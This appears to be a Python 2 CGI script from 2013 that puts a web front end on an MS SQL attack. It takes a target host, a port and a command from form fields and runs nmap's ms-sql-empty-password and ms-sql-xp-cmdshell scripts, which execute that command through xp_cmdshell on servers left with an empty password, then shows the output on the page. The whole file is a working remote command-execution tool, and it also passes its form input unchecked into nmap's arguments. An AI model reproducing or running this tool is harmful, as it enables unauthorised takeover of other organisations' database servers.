#!/usr/bin/python

#Tumi (c) 2013 va_testsqli.py

import nmap
import datetime
import cgi
import cgitb
cgitb.enable()

# GET
form = cgi.FieldStorage()
host = form.getfirst("host")
port =  form.getfirst("port")
cmd =  form.getfirst("cmd")

# HTML HEADERS
print "Content-Type: text/html; charset=UTF-8"	# Print headers
print ""

# HTML 
print '''
<html>
<body>
'''

msg = ""
currentScan = nmap.PortScanner()
evil='--script=ms-sql-empty-password.nse,ms-sql-xp-cmdshell.nse --script-args=mssql-xp-cmdshell.cmd=' + cmd
currentScan.scan(hosts=host, arguments=evil, ports=port)
hostip=str(currentScan.all_hosts()).strip('[]').replace("'","").replace("u","")
print hostip
#print len(hostip)
if len(hostip) > 0:
	if currentScan[hostip].state() =="up" and currentScan[hostip]['tcp'][int(port)]['state'] == "open":
		output = currentScan[hostip]['tcp'][int(port)]['script']
		msg = "%(ms-sql-xp-cmdshell)s" % output

print " <textarea style=\"margin: 2px; height: 380px; width: 450px; color: white; background-color: transparent; \"> " + msg + "</textarea>"